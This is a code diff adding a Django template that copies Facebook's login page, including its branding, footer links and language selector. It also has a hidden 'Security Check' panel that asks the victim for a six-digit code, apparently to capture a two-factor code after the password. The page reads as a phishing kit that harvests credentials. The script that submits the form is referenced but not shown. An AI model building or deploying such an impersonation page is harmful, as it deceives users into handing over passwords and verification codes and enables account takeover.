@@ -1,0 +1,104 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook - Log In or Create New Account</title>
+    <link rel="stylesheet" href="{% static "style.css" %}">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <h1 class="logo">facebook</h1>
+        </div>
+        
+        <div class="login-container">
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" id="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="links-container">
+                <a href="#" class="forgot-link">Forgotten password?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <button class="create-account-button">Create new account</button>
+        </div>
+    </div>
+    
+    <div id="security-check" class="hidden">
+        <div class="security-check-content">
+            <h2>Security Check</h2>
+            <p>For your security, we need to verify your identity. We've sent a code to your email. Please enter it below.</p>
+            <input type="text" id="security-code" placeholder="Enter security code" maxlength="6">
+            <button id="verify-security" class="verify-button">Continue</button>
+            <a href="#" class="try-another-way">Try another way</a>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="language-selector">
+            <a href="#" class="active">English (UK)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">ਪੰਜਾਬੀ</a>
+            <a href="#">اردو</a>
+            <a href="#">தமிழ்</a>
+            <a href="#">বাংলা</a>
+            <a href="#">മലയാളം</a>
+            <a href="#">Español</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Deutsch</a>
+            <a href="#" class="more-languages">+</a>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">facebook Pay</a>
+            <a href="#">Oculus</a>
+            <a href="#">Portal</a>
+            <a href="#">Instagram</a>
+            <a href="#">Bulletin</a>
+            <a href="#">Local</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Centre</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Privacy</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact uploading and non-users</a>
+        </div>
+        
+        <div class="copyright">
+            facebook © 2025
+        </div>
+    </footer>
+    
+    <script src="{% static 'scrip.js' %}"></script>
+</body>
+</html>
+
